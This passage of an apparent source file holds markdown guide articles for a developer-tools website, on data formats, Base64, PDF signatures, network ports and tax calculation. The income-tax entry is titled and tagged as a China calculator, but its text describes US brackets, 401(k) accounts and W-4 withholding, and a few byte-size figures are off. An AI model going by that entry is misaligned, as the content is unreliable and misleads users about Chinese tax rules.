    "pool_size": 10
  },
  "features": [
    "authentication",
    "caching",
    "logging"
  ]
}
\`\`\`

## Key Differences Between YAML and JSON

| Feature | YAML | JSON |
|---------|------|------|
| Comments | Yes (\`#\`) | No |
| Readability | High | Medium |
| Verbosity | Low | Higher |
| Multi-line strings | Natural | Requires \`\\n\` escaping |
| Trailing commas | N/A | Not allowed |
| Data types | Rich (dates, etc.) | Limited (string, number, bool, null, array, object) |
| Parsing complexity | High | Low |
| Security concerns | Higher (YAML bombs) | Lower |

## YAML Anchors and Aliases

YAML supports powerful features that have no JSON equivalent:

\`\`\`yaml
defaults: &defaults
  timeout: 30
  retries: 3

production:
  <<: *defaults
  host: prod.example.com

staging:
  <<: *defaults
  host: staging.example.com
\`\`\`

When converting to JSON, anchors/aliases are resolved — the referenced values are inlined.

## Common YAML-to-JSON Use Cases

### Kubernetes Configuration
Kubernetes manifests are written in YAML but the API server processes JSON:
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  replicas: 3
\`\`\`

### CI/CD Pipeline Files
GitHub Actions, GitLab CI, and CircleCI use YAML but many tools process their output as JSON.

### Docker Compose
Docker Compose files are YAML. Tools that inspect compose configurations often work with JSON representations.

## Using the YAML-to-JSON Converter

Our converter:
1. **Paste or type YAML** in the input panel
2. **Instant JSON output** — converts in real-time as you type
3. **Syntax validation** — highlights YAML errors before conversion
4. **Formatted output** — pretty-printed JSON with proper indentation
5. **Copy JSON** — one-click copy to clipboard
6. **Download** — save the converted JSON as a file

The tool handles all YAML features including anchors, multi-line strings, complex nesting, and edge cases around type inference.
`,
  },
  {
    slug: 'toml-to-json-guide',
    toolPath: '/toml-to-json',
    title: 'TOML to JSON: What Is TOML and When Should You Use It?',
    description: 'Convert TOML to JSON. Learn about TOML configuration format, its advantages over YAML, and common use cases.',
    keywords: ['TOML to JSON', 'TOML format', 'TOML converter', 'TOML vs YAML', 'configuration format'],
    category: 'Converter',
    publishedAt: '2025-09-11',
    content: `## What Is TOML?

**TOML** (Tom's Obvious, Minimal Language) is a configuration file format designed to be easy to read and write, with unambiguous semantics. It was created by Tom Preston-Werner (GitHub co-founder) as an alternative to INI files with support for richer data types.

TOML is widely used in:
- **Rust** projects (Cargo.toml)
- **Python** projects (pyproject.toml)
- **Hugo** static site generator
- **Gitea/Forgejo** configuration
- Many other developer tools

## TOML Syntax

TOML uses a clear, section-based structure:

\`\`\`toml
# This is a TOML configuration file

[package]
name = "my-project"
version = "1.0.0"
edition = "2021"

[dependencies]
serde = { version = "1.0", features = ["derive"] }
tokio = "1.0"

[server]
host = "0.0.0.0"
port = 8080
workers = 4

[[environments]]
name = "development"
debug = true

[[environments]]
name = "production"
debug = false
\`\`\`

## TOML Data Types

TOML has explicit, strongly-typed values:

| Type | Example |
|------|---------|
| String | \`"hello"\` or \`'literal'\` |
| Integer | \`42\` or \`0xFF\` or \`1_000_000\` |
| Float | \`3.14\` or \`6.022e23\` |
| Boolean | \`true\` / \`false\` |
| Date-Time | \`1979-05-27T07:32:00Z\` |
| Local Date | \`1979-05-27\` |
| Local Time | \`07:32:00\` |
| Array | \`[1, 2, 3]\` |
| Inline Table | \`{name = "Alice", age = 30}\` |

TOML's explicit typing prevents the ambiguity that sometimes occurs in YAML (where \`true\` and \`"true"\` might be confused).

## The Equivalent JSON

Converting the TOML example above:

\`\`\`json
{
  "package": {
    "name": "my-project",
    "version": "1.0.0",
    "edition": "2021"
  },
  "dependencies": {
    "serde": {
      "version": "1.0",
      "features": ["derive"]
    },
    "tokio": "1.0"
  },
  "server": {
    "host": "0.0.0.0",
    "port": 8080,
    "workers": 4
  },
  "environments": [
    {"name": "development", "debug": true},
    {"name": "production", "debug": false}
  ]
}
\`\`\`

Note: TOML's \`[[environments]]\` (array of tables) becomes a JSON array.

## TOML vs. JSON vs. YAML

| Feature | TOML | JSON | YAML |
|---------|------|------|------|
| Comments | Yes | No | Yes |
| Strong typing | Yes | Partial | No |
| Multi-line strings | Yes | No (use \\n) | Yes |
| Human readability | High | Medium | High |
| Date/time support | Native | String only | Partial |
| Array of tables | Elegant | Verbose | Verbose |
| Anchors/aliases | No | No | Yes |
| Spec complexity | Low | Low | High |

## When to Use TOML vs. JSON

**Use TOML when:**
- Writing configuration files meant to be edited by humans
- Working in the Rust/Python ecosystem
- You need date/time type support
- Comments are important for documentation

**Use JSON when:**
- Communicating with web APIs
- Generating configuration programmatically
- Maximum parser compatibility is needed
- Working in JavaScript/Node.js environments

## Using the TOML-to-JSON Converter

Our converter:
1. **Paste TOML configuration** in the input
2. **Get instant JSON output** with proper formatting
3. **Handles all TOML types** including dates, times, and array-of-tables
4. **Syntax validation** with helpful error messages
5. **Copy or download** the resulting JSON

Useful for integrating TOML-configured tools with JSON-based APIs, debugging configurations, and understanding TOML structure by seeing the equivalent JSON representation.
`,
  },
  {
    slug: 'json-minify-guide',
    toolPath: '/json-minify',
    title: 'JSON Minification: Reduce JSON File Size for Production',
    description: 'Minify JSON by removing whitespace. Learn when to minify and how much size reduction to expect.',
    keywords: ['JSON minify', 'minify JSON', 'compress JSON', 'JSON optimize', 'JSON size reduction'],
    category: 'Development',
    publishedAt: '2025-09-12',
    content: `## What Is JSON Minification?

JSON minification removes all unnecessary whitespace — spaces, tabs, and newlines — from a JSON document without changing its data or structure. The result is functionally identical JSON that takes up significantly less space.

## Why Minify JSON?

### Network Performance
Every byte matters for web performance. A typical API response minified from 15KB to 8KB:
- Reduces transfer time over slow connections
- Decreases bandwidth costs on cloud platforms that charge per GB
- Improves Time to First Byte (TTFB) metrics
- Faster parsing since less data needs to be processed

### Storage Efficiency
When storing JSON in databases, files, or caches, minified JSON uses less space. At scale, this can translate to meaningful cost savings and performance improvements.

### Embedding in Code
When embedding JSON in HTML, JavaScript, or other files, minified JSON is more appropriate and less disruptive to the surrounding code.

## What Gets Removed During Minification

Minification removes:
- Spaces and tabs between tokens
- Newlines and carriage returns
- Unnecessary whitespace inside strings is preserved (spaces within string values are kept)

What is NOT removed:
- Spaces within string values
- Any actual data or structure
- Object keys and values
- Array elements

## Before and After Example

**Formatted JSON (198 bytes):**
\`\`\`json
{
  "user": {
    "id": 12345,
    "name": "Alice Smith",
    "email": "alice@example.com",
    "active": true,
    "roles": [
      "admin",
      "editor"
    ]
  }
}
\`\`\`

**Minified JSON (104 bytes — 47% smaller):**
\`\`\`json
{"user":{"id":12345,"name":"Alice Smith","email":"alice@example.com","active":true,"roles":["admin","editor"]}}
\`\`\`

## JSON Minification in Practice

### Node.js
\`\`\`javascript
const data = require('./data.json');
const minified = JSON.stringify(data); // No spaces = minified
const formatted = JSON.stringify(data, null, 2); // 2-space indentation
\`\`\`

### Python
\`\`\`python
import json
with open('data.json') as f:
    data = json.load(f)
minified = json.dumps(data, separators=(',', ':'))
\`\`\`

### Build Pipeline
Many build tools handle JSON minification automatically:
- Webpack minifies JSON imports in JavaScript bundles
- \`jq\` CLI tool: \`jq -c . data.json\` outputs compact JSON
- Online tools for quick one-off minification

## JSON Compression vs. Minification

Minification and compression serve different purposes:

**Minification**: Removes whitespace, reduces raw JSON size
**Compression**: Applies algorithms (gzip, Brotli) to compress binary representation

They complement each other. Minified JSON compresses better than formatted JSON because:
- Less redundant whitespace for the compressor to ignore
- More consistent patterns that compression algorithms exploit well

For web APIs, enabling gzip compression (\`Content-Encoding: gzip\`) on your server is often more impactful than manual minification.

## When to Minify vs. Format

**Minify when:**
- Serving JSON via HTTP API (handle with server compression)
- Storing in databases or files at scale
- Embedding JSON in web pages
- Distributing JSON as downloadable data

**Keep formatted when:**
- Writing configuration files
- Version-controlling JSON (readable diffs)
- Debugging and development
- Documentation examples

## Common JSON Minification Pitfalls

### Removing Comments
Standard JSON doesn't support comments, but some tools (VS Code settings, JSON5 format) do. Minification tools may strip non-standard comments, which is usually desired.

### String Escaping
Minification should preserve string content exactly, including whitespace inside string values. "hello world" with a space inside stays "hello world" — only structural whitespace is removed.

## Using the JSON Minify Tool

Our tool:
1. **Paste formatted JSON** — supports any valid JSON
2. **Instant minification** — removes all unnecessary whitespace
3. **Shows size reduction** — displays original and minified byte count
4. **Validates JSON** — highlights errors before minification
5. **Copy minified result** — one-click clipboard copy

Use it for optimizing API payloads, preparing JSON for production, and understanding the size impact of your JSON structures.
`,
  },
  {
    slug: 'base64-file-converter-guide',
    toolPath: '/base64-file-converter',
    title: 'Base64 File Converter: Encode Any File to Base64 String',
    description: 'Convert any file to Base64 string and back. Learn when to use Base64 for file embedding and data URIs.',
    keywords: ['base64 file converter', 'file to base64', 'base64 encode file', 'data URI', 'embed file base64'],
    category: 'Converter',
    publishedAt: '2025-09-13',
    content: `## What Is Base64 File Encoding?

Base64 encoding converts binary file data into ASCII text characters. This makes it possible to embed binary files (images, PDFs, fonts, audio) directly in text-based formats like HTML, CSS, JavaScript, JSON, and XML — where raw binary data would be invalid or cause parsing issues.

## Why Base64 for Files?

### Data URLs in HTML/CSS
Embed images directly without separate HTTP requests:
\`\`\`html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA..." />
\`\`\`

\`\`\`css
.icon {
  background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxu...');
}
\`\`\`

### Email Attachments (MIME)
Email uses Base64 to encode attachments in the MIME multipart format, since email protocols were originally designed for 7-bit ASCII text only.

### JSON API Payloads
Transmit file contents in JSON APIs without separate file upload endpoints:
\`\`\`json
{
  "filename": "report.pdf",
  "content": "JVBERi0xLjQKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3Ro...",
  "encoding": "base64"
}
\`\`\`

### Storing Binary in Databases
Some database fields store binary data as Base64-encoded strings in text columns, particularly when binary column types aren't available or practical.

## How Base64 Works

Base64 uses 64 characters: A-Z, a-z, 0-9, \`+\`, \`/\`, and \`=\` for padding.

The encoding process:
1. Take 3 bytes (24 bits) of binary data
2. Split into four 6-bit groups
3. Map each 6-bit value to a Base64 character
4. If input isn't divisible by 3, add \`=\` padding

Size impact: Base64 increases file size by approximately **33%** (4 characters for every 3 bytes of input, or 8 bits for every 6 bits of input).

## Base64 Variants

### Standard Base64
Uses \`+\` and \`/\` as characters 62 and 63. Padding with \`=\`.

### URL-Safe Base64
Replaces \`+\` with \`-\` and \`/\` with \`_\` to avoid URL encoding issues. Used in JWT tokens, URL parameters, and filenames.

### Base64 Without Padding
Some systems omit the trailing \`=\` padding. Node.js's \`base64url\` encoding does this.

## Common File Types and Data URLs

| File Type | MIME Type | Data URL Prefix |
|-----------|-----------|-----------------|
| PNG image | image/png | \`data:image/png;base64,\` |
| JPEG image | image/jpeg | \`data:image/jpeg;base64,\` |
| SVG image | image/svg+xml | \`data:image/svg+xml;base64,\` |
| PDF | application/pdf | \`data:application/pdf;base64,\` |
| Web font (WOFF) | font/woff | \`data:font/woff;base64,\` |
| Audio (MP3) | audio/mpeg | \`data:audio/mpeg;base64,\` |

## Performance Considerations

### Pros of Embedding with Data URLs
- Eliminates HTTP request for the embedded resource
- Useful for small images in critical rendering path
- Works offline/in local files without a server

### Cons of Embedding with Data URLs
- Increases HTML/CSS file size by 33% per embedded file
- Resources cannot be cached independently by the browser
- Larger payloads can slow initial page rendering
- Binary data in text files makes version control diffs harder

**Rule of thumb**: Use Base64 data URLs for small resources under 5KB. For larger files, keep them as separate assets.

## Encoding Files Programmatically

### Node.js
\`\`\`javascript
const fs = require('fs');
const fileData = fs.readFileSync('image.png');
const base64 = fileData.toString('base64');
const dataUrl = \`data:image/png;base64,\${base64}\`;
\`\`\`

### Python
\`\`\`python
import base64
with open('image.png', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode('utf-8')
data_url = f'data:image/png;base64,{encoded}'
\`\`\`

### Browser (FileReader API)
\`\`\`javascript
const reader = new FileReader();
reader.onload = (e) => console.log(e.target.result); // data URL
reader.readAsDataURL(file);
\`\`\`

## Using the Base64 File Converter Tool

Our tool provides:
1. **Drag-and-drop file upload** — accept any file type
2. **Instant Base64 encoding** — converts immediately on file selection
3. **Data URL generation** — automatically prepends the correct MIME type prefix
4. **Decoding support** — paste Base64 to download the original file
5. **Copy to clipboard** — one-click copy for both raw Base64 and full data URL
6. **File size comparison** — shows original vs. encoded size

Use it for embedding images in single-page HTML exports, preparing files for JSON API upload, generating CSS data URLs, and debugging Base64-encoded content in network requests.
`,
  },
  {
    slug: 'pdf-signature-checker-guide',
    toolPath: '/pdf-signature-checker',
    title: 'PDF Digital Signatures: How to Verify Document Authenticity',
    description: 'Check digital signatures in PDF files. Learn how PDF signatures work and how to verify document authenticity.',
    keywords: ['PDF signature checker', 'digital signature', 'PDF verify', 'document authenticity', 'PDF certificate'],
    category: 'Crypto',
    publishedAt: '2025-09-14',
    content: `## What Is PDF Digital Signature Verification?

A **digital signature** on a PDF document provides cryptographic proof of two things:
1. **Identity**: The document was signed by the claimed signer
2. **Integrity**: The document hasn't been modified since it was signed

Unlike a scanned handwritten signature (just an image), a digital signature is a mathematical construct based on public-key cryptography that provides strong, verifiable guarantees.

## How PDF Digital Signatures Work

### The Signing Process
1. A **hash** of the PDF content is computed (e.g., SHA-256)
2. The hash is **encrypted** using the signer's private key
3. The encrypted hash (the signature) is embedded in the PDF
4. The signer's **certificate** (containing their public key) is also stored in the PDF

### The Verification Process
1. Extract the signature and certificate from the PDF
2. Decrypt the signature using the **public key** from the certificate
3. Independently compute the hash of the current PDF content
4. Compare: if both hashes match, the signature is valid and the document hasn't changed

### Trust Chain
A certificate by itself doesn't prove identity — anyone could generate one. Trust is established through a **Certificate Authority (CA) chain**:
- Your certificate is signed by an intermediate CA
- The intermediate CA's certificate is signed by a root CA
- Root CAs are pre-installed in operating systems and browsers as trusted

## Types of PDF Signatures

### Approval Signature
Signs the document at a point in time. Additional signatures can be added afterward (each covers the content at the time of signing).

### Certification Signature (DocMDP)
Controls what changes are permitted to the document after signing:
- Level 1: No changes allowed
- Level 2: Only form filling and annotations allowed
- Level 3: Form filling, annotations, and page additions allowed

### Invisible Signature
Cryptographic signature without a visible graphical element in the document.

### Visible Signature
Includes both the cryptographic signature and a visible representation (often a signature image, name, date, and reason).

## PDF Signature Validation States

When verifying a PDF signature, the result can be:

### Valid
- Signature cryptographically verifies
- Certificate chain is trusted
- No modifications since signing

### Valid but with Issues
- Signature is mathematically valid
- Certificate may be expired, untrusted, or revoked
- Document may have been modified in allowed ways (approved changes)

### Invalid
- Document has been modified after signing
- The computed hash doesn't match the signature

### Unknown
- Cannot verify without internet access (for OCSP/CRL checks)
- Certificate chain leads to an untrusted root

## Long-Term Validation (LTV)

Standard signatures can become unverifiable over time as certificates expire. **Long-Term Validation (LTV)** embeds all verification information in the PDF itself:
- Certificate chain
- OCSP responses (certificate validity proof)
- Timestamps from trusted timestamping authorities

LTV-enabled PDFs can be verified years or decades after signing without internet access.

## PAdES, CAdES, and XAdES Standards

Different signature standards are used in different contexts:

- **PAdES** (PDF Advanced Electronic Signatures): European standard for PDF signatures, required for legal compliance in EU
- **CAdES**: For arbitrary data, not just PDFs
- **XAdES**: For XML documents

The EU's eIDAS regulation defines signature levels:
- **SES** (Simple): Basic digital signature
- **AdES** (Advanced): Signer identity linked to signature
- **QES** (Qualified): Highest legal value, equivalent to handwritten signature in EU law

## Common Signature Issues

### Self-Signed Certificates
Many PDF signing tools allow creating certificates without CA involvement. These are "self-signed" — the certificate is signed by its own private key. They provide integrity guarantees but no identity assurance.

### Expired Certificates
A signature made with a certificate that was valid at signing time remains valid if properly timestamped. LTV handles this correctly. Without LTV, expired certificates may cause false "invalid" warnings.

### Incremental Updates
PDFs can be modified by appending new data (incremental updates) without overwriting the original signed content. Partial signatures cover only the original content; understanding this is important when reviewing signed PDFs that were later modified.

## Using the PDF Signature Checker

Our tool:
1. **Upload a PDF** via drag-and-drop or file picker
2. **Extracts all signatures** from the document
3. **Verifies each signature** cryptographically
4. **Shows certificate details** — issuer, subject, validity period
5. **Indicates trust status** — trusted CA, self-signed, or unknown
6. **Reports modification status** — whether document was changed after signing
7. **Processes client-side** — your PDF is never uploaded to a server

Use it for verifying signed contracts, checking certificate-signed documents, auditing PDF integrity, and understanding what digital signatures actually prove about a document.
`,
  },
  {
    slug: 'income-tax-calculator-guide',
    toolPath: '/income-tax-calculator',
    title: 'China Income Tax Calculator: How to Calculate Your Take-Home Pay',
    description: 'Calculate your after-tax income in China. Understand the progressive tax brackets, social insurance, and special deductions.',
    keywords: ['China income tax', 'personal income tax calculator', '个人所得税', 'tax bracket China', 'social insurance'],
    category: 'Math',
    publishedAt: '2025-09-15',
    content: `## Understanding Income Tax Systems

Income tax is the primary source of government revenue in most countries. Understanding how it works — and how to calculate it accurately — is essential for financial planning, salary negotiations, and compliance.

## Progressive Tax Systems

Most developed countries use **progressive taxation**: higher income levels are taxed at higher rates. A critical concept is that higher rates only apply to income *above* each bracket threshold, not to your entire income.

### How Tax Brackets Work

Example (simplified US-style brackets):

| Income Range | Rate |
|-------------|------|
| $0 - $10,000 | 10% |
| $10,001 - $40,000 | 20% |
| $40,001 - $85,000 | 30% |
| Over $85,000 | 37% |

For someone earning $60,000:
- First $10,000 @ 10% = $1,000
- Next $30,000 @ 20% = $6,000
- Remaining $20,000 @ 30% = $6,000
- **Total tax: $13,000** (effective rate: 21.7%)

The **marginal rate** (30%) applies only to the last dollar earned. The **effective rate** (21.7%) represents total tax as a percentage of total income.

## Types of Income Tax

### Individual Income Tax
Tax on wages, salaries, tips, freelance income, and other personal earnings. Most countries require annual filing and may collect through payroll withholding.

### Self-Employment Tax
Self-employed individuals typically pay both the employee and employer portions of social security and Medicare taxes (in the US, this is 15.3% on net self-employment income).

### Capital Gains Tax
Tax on profits from selling investments:
- **Short-term** (held under 1 year): Often taxed as ordinary income
- **Long-term** (held over 1 year): Lower preferential rates in many countries

### Dividend Tax
Qualified dividends often receive favorable rates. Ordinary dividends are taxed as regular income.

## Tax Deductions vs. Tax Credits

### Deductions
Reduce your **taxable income** before calculating tax. Value depends on your marginal rate.

Example: A $1,000 deduction with a 30% marginal rate saves $300 in tax.

Common deductions:
- Mortgage interest
- Charitable contributions
- Business expenses
- Health insurance premiums (self-employed)
- Retirement account contributions (401k, IRA)

### Credits
Directly reduce your **tax liability** — dollar for dollar. More valuable than deductions of equal amount.

Example: A $1,000 tax credit reduces tax by $1,000 regardless of your bracket.

Common credits:
- Child tax credit
- Earned income tax credit
- Education credits
- Energy efficiency credits

## Standard Deduction vs. Itemizing

Most tax systems offer a choice:
- **Standard deduction**: Fixed amount anyone can take without documentation
- **Itemized deductions**: Sum of qualifying expenses (mortgage interest, donations, etc.)

Take whichever is larger. Recent US tax reform significantly increased the standard deduction, meaning fewer people benefit from itemizing.

## Payroll Taxes and Withholding

For employees, income taxes are typically withheld from each paycheck by employers. Additional payroll taxes (Social Security and Medicare in the US) are also withheld.

The withholding amount depends on:
- Income level
- Filing status (single, married, head of household)
- Claimed allowances or adjustments (W-4 form in the US)

Under-withholding results in taxes owed at filing; over-withholding results in a refund.

## Tax Planning Strategies

### Maximize Retirement Contributions
401(k), IRA, and pension contributions are often tax-deferred, reducing current taxable income while building retirement savings.

### Tax-Loss Harvesting
Selling investments at a loss to offset capital gains taxes. The loss can offset up to $3,000 of ordinary income after gains are netted.

### Bunching Deductions
Combining two years of charitable donations into a single year to exceed the standard deduction threshold, then taking the standard deduction the alternate year.

### Health Savings Accounts (HSA)
Triple tax advantage: contributions are deductible, growth is tax-free, and qualified medical withdrawals are tax-free.

## Using the Income Tax Calculator

Our calculator:
1. **Enter your gross income** — annual or monthly
2. **Select filing status** — single, married filing jointly, head of household
3. **Input deductions** — standard or itemized amounts
4. **Add other income** — capital gains, dividends, self-employment
5. **See breakdown** — taxable income, tax by bracket, and effective rates

The calculator provides estimates for planning purposes. Tax laws change annually, and individual situations vary. Always consult a tax professional for advice specific to your situation.
`,
  },
  {
    slug: 'random-port-generator-guide',
    toolPath: '/random-port-generator',
    title: 'Network Ports Explained: Reserved, Registered, and Dynamic Ranges',
    description: 'Generate random available network ports. Learn about port ranges, well-known ports, and how to avoid conflicts.',
    keywords: ['random port generator', 'port number', 'network port', 'available port', 'port ranges'],
    category: 'Development',
    publishedAt: '2025-09-16',
    content: `## What Is a Network Port?

A **network port** is a virtual endpoint for network communication, identified by a number from 0 to 65535. Ports allow a single computer (with one IP address) to run multiple network services simultaneously. The combination of IP address + port number uniquely identifies a network socket.

When your browser connects to \`https://example.com\`, it's actually connecting to \`example.com:443\` — port 443 is the standard HTTPS port.

## Port Number Ranges

Port numbers are divided into three ranges by IANA (Internet Assigned Numbers Authority):

### Well-Known Ports (0-1023)
Reserved for system services and standard protocols. Require administrative/root privileges to bind on most operating systems.

Common well-known ports:
| Port | Protocol | Service |
|------|----------|---------|
| 20/21 | TCP | FTP |
| 22 | TCP | SSH |
| 25 | TCP | SMTP |
| 53 | UDP/TCP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 |
| 143 | TCP | IMAP |
| 443 | TCP | HTTPS |
| 3306 | TCP | MySQL (note: not well-known range) |

### Registered Ports (1024-49151)
Registered with IANA for specific applications but don't require special privileges. Common services:
| Port | Service |
|------|---------|
| 1433 | Microsoft SQL Server |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 8080 | HTTP alternative |
| 8443 | HTTPS alternative |
| 27017 | MongoDB |

### Dynamic/Ephemeral Ports (49152-65535)
Assigned temporarily by the OS for client-side connections. When your browser makes a connection, the OS assigns one of these ports as the source port. Also suitable for development servers and custom applications.

## Why Random Port Generation?

### Development and Testing
When building and testing multiple services locally, you need ports that:
- Don't conflict with each other
- Don't conflict with system services
- Are easy to remember or assign programmatically

A random port generator ensures you get a port in a suitable range that's unlikely to be already in use.

### Docker and Container Orchestration
When starting many containers, each needing an exposed port, random assignment prevents conflicts:
\`\`\`bash
docker run -p $(random-port):80 my-app
\`\`\`

### Penetration Testing
Security professionals test services across port ranges. Understanding standard vs. non-standard port usage is important for both offense and defense.

### Firewall Configuration
Generating lists of ports for firewall rules, testing port accessibility, and documenting allowed ports.

## Checking Port Availability

Before using a randomly generated port, verify it's available:

### Linux/macOS
\`\`\`bash
# Check if port 8080 is in use
lsof -i :8080
# or
ss -tlnp | grep :8080
# or
netstat -an | grep 8080
\`\`\`

### Windows
\`\`\`cmd
netstat -an | findstr :8080
\`\`\`

### Node.js
\`\`\`javascript
const net = require('net');
function isPortFree(port) {
  return new Promise(resolve => {
    const server = net.createServer();
    server.once('error', () => resolve(false));
    server.once('listening', () => { server.close(); resolve(true); });
    server.listen(port);
  });
}
\`\`\`

## Ports to Avoid

Some ports cause problems even if not currently in use:

- **Port 0**: Reserved, OS assigns an available port when used
- **Ports 1-1023**: Require root/admin privileges on Unix systems
- **Common dev ports**: 3000, 4000, 5000, 8080, 8000 — likely already in use
- **Chrome's blocked ports**: Browsers block requests to certain ports for security (e.g., 587, 25, 21)

## TCP vs. UDP Ports

Both TCP and UDP use port numbers, but they're independent:
- Port 53/TCP and port 53/UDP are separate endpoints
- DNS uses both (TCP for large responses, UDP for regular queries)
- A service can listen on both TCP and UDP simultaneously

## Using the Random Port Generator

Our tool:
1. **Generates random ports** in configurable ranges (1024-49151 or full 0-65535)
2. **Multiple ports at once** — generate a list for multi-service setups
3. **Avoid well-known ports** — option to skip the 0-1023 range
4. **Format options** — copy as comma-separated list, one per line, or JSON array
5. **Port information** — shows if a generated port matches a known service

Use it for development environment setup, container port mapping, testing port scanners, and generating port ranges for network documentation.
`,
  },
  {
    slug: 'json-viewer-guide',
    toolPath: '/json-viewer',
    title: 'JSON Viewer: Navigate and Explore Complex JSON Structures',
    description: 'Explore large JSON files with a collapsible tree viewer. Navigate nested objects and arrays with ease.',
    keywords: ['JSON viewer', 'JSON tree view', 'explore JSON', 'JSON explorer', 'JSON browser'],
    category: 'Development',
    publishedAt: '2025-09-17',
    content: `## What Is a JSON Viewer?

A JSON viewer is a tool that parses raw JSON text and displays it in a human-readable, interactive format. Raw JSON can be difficult to read — especially deeply nested structures or minified data — and a viewer transforms it into a navigable tree structure with syntax highlighting.

## Why JSON Viewing Matters

### Raw JSON Challenges
Unformatted JSON from an API response or log file looks like:
\`\`\`
{"users":[{"id":1,"name":"Alice","roles":["admin","editor"],"profile":{"age":28,"city":"NYC"}},{"id":2,"name":"Bob","roles":["viewer"],"profile":{"age":35,"city":"LA"}}]}
\`\`\`

This is technically valid but nearly impossible to read at a glance.

### Formatted View
The same data with proper indentation:
\`\`\`json
{
  "users": [
    {
      "id": 1,
      "name": "Alice",
      "roles": ["admin", "editor"],
      "profile": {
        "age": 28,
        "city": "NYC"
      }
    },
    {
      "id": 2,
      "name": "Bob",
      "roles": ["viewer"],
      "profile": {
        "age": 35,
        "city": "LA"
      }
    }
  ]
}
\`\`\`

### Tree View
An interactive tree view allows collapsing and expanding sections, searching for specific keys, and understanding the data hierarchy without scrolling through the entire document.

## JSON Viewer Features

### Syntax Highlighting
Color-coding by data type helps quickly identify:
- Strings (usually green)
- Numbers (blue or purple)
- Booleans (orange)
- Null values (gray)
- Keys (red or yellow)
- Brackets and braces (white/default)

### Path Navigation
When hovering or clicking on a value, showing its full JSON path:
- \`$.users[0].profile.city\` = "NYC"
- \`$.users[1].roles[0]\` = "viewer"

This is invaluable for writing JSONPath queries or understanding data access in code.

### Search and Filter
Find all occurrences of a key or value within large JSON documents. Essential when working with API responses containing hundreds of fields.

### Schema Detection
Some viewers detect patterns and suggest the implied schema — all users have the same fields, arrays contain objects of consistent types, etc.

## JSON Path Expressions

JSONPath is a query language for JSON (similar to XPath for XML):

\`\`\`
$              Root element
.key           Access object property
[0]            Access array element by index
[*]            All elements
..key          Recursive descent (find key anywhere)
[?(@.age>18)]  Filter expression
\`\`\`

Examples on our user data:
- \`$.users[*].name\` → ["Alice", "Bob"]
- \`$.users[?(@.id==1)].profile.city\` → "NYC"
- \`$.users[*].roles[0]\` → ["admin", "viewer"]

## JSON Schema Validation

JSON Schema defines the structure and constraints for JSON data:

\`\`\`json
{
  "type": "object",
  "properties": {
    "users": {
      "type": "array",
      "items": {
        "type": "object",
        "required": ["id", "name"],
        "properties": {
          "id": {"type": "integer"},
          "name": {"type": "string"}
        }
      }
    }
  }
}
\`\`\`

Validating API responses against their schema catches integration bugs early.

## Common JSON Viewer Use Cases

### API Development
After calling an API endpoint, paste the response into a viewer to understand the data structure before writing code to consume it.

### Debugging
When a function receives unexpected data, copy the value to JSON viewer to see exactly what's there — null values, wrong types, missing fields.

### Configuration Review
Configuration files in JSON format (package.json, tsconfig.json, etc.) are easier to audit in a viewer that highlights structure.

### Log Analysis
Applications that log structured JSON (structured logging) produce viewable records that make debugging much cleaner than plain text logs.

## Using the JSON Viewer Tool

Our JSON viewer:
1. **Paste or type JSON** — accepts minified or formatted input
2. **Interactive tree view** — expand/collapse any node
3. **Syntax highlighting** — color-coded by value type
4. **Search** — find keys or values anywhere in the document
5. **Format/Minify toggle** — switch between readable and compact views
6. **JSON path** — shows path to the currently selected value
7. **Validation** — reports syntax errors with line numbers
8. **Download** — save formatted JSON as a file

The tool handles large JSON documents efficiently, making it suitable for API response inspection, log analysis, and configuration review in daily development work.
`,
  },
  {
    slug: 'xml-to-json-guide',
    toolPath: '/xml-to-json',
    title: 'XML to JSON Converter: Migrate from Legacy XML APIs',
    description: 'Convert XML to JSON for modern applications. Learn about the structural differences and common conversion patterns.',
    keywords: ['XML to JSON', 'convert XML JSON', 'XML converter', 'XML API to JSON', 'XML parser'],
    category: 'Converter',
    publishedAt: '2025-09-18',
    content: `## XML vs. JSON: When and Why to Convert

**XML** (Extensible Markup Language) and **JSON** (JavaScript Object Notation) are both text-based data interchange formats, but they serve different ecosystems. XML dominated enterprise and web services through the 2000s, while JSON has become the standard for modern REST APIs. Converting between them is a common task when integrating older systems with newer ones.

## Why Convert XML to JSON?

### Modern API Consumption
Most JavaScript frameworks and modern backends work natively with JSON. XML responses from older APIs need conversion before they can be easily processed.

### Performance
JSON is typically more compact than equivalent XML:
- XML has opening and closing tags for each field
- XML requires explicit type declarations
- JSON arrays map naturally to JavaScript arrays
- JSON parsing is generally faster in JavaScript engines

### Developer Experience
JSON is easier to read and write manually. The \`JSON.parse()\` and \`JSON.stringify()\` functions are built into every JavaScript runtime.

### Integration
Modern tools like Node.js, Python's requests library, and virtually all REST APIs use JSON natively.

## XML Structure vs. JSON Structure

### Simple XML
\`\`\`xml
<user>
  <id>123</id>
  <name>Alice Smith</name>
  <email>alice@example.com</email>
  <active>true</active>
</user>
\`\`\`

Equivalent JSON:
\`\`\`json
{
  "user": {
    "id": "123",
    "name": "Alice Smith",
    "email": "alice@example.com",
    "active": "true"
  }
}
\`\`\`

### XML with Attributes
\`\`\`xml
<product id="456" category="electronics">
  <name>Laptop</name>
  <price currency="USD">999.99</price>
</product>
\`\`\`

Common JSON representations for attributes:
\`\`\`json
{
  "product": {
    "@id": "456",
    "@category": "electronics",
    "name": "Laptop",
    "price": {
      "@currency": "USD",
      "#text": "999.99"
    }
  }
}
\`\`\`

Attributes create ambiguity in XML-to-JSON conversion — different libraries handle them differently.

### XML Arrays (Repeated Elements)
\`\`\`xml
<users>
  <user><id>1</id><name>Alice</name></user>
  <user><id>2</id><name>Bob</name></user>
</users>
\`\`\`

JSON conversion (array of objects):
\`\`\`json
{
  "users": {
    "user": [
      {"id": "1", "name": "Alice"},
      {"id": "2", "name": "Bob"}
    ]
  }
}
\`\`\`

## Common Challenges in XML-to-JSON Conversion

### Type Information
XML has no native type system — everything is text. In the example above, \`id\` became the string "123" rather than the number 123. Type coercion must be handled explicitly or by convention.

### Attributes vs. Elements
XML allows both \`<tag attribute="value">content</tag>\` and nested \`<parent><child>value</child></parent>\`. These need consistent handling in the JSON representation.

